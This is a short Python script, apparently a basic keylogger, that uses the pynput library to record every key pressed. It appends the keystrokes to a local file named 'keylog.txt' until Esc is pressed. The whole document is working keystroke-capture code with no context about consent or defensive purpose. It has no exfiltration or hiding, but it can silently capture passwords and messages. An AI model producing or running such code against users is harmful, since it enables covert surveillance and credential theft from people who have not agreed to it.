from pynput import keyboard

# Specify the log file path
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log the key to the file
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like Shift, Ctrl, etc.)
        with open(log_file, "a") as log:
            log.write(f"{key}")

def on_release(key):
    # Stop the keylogger when 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
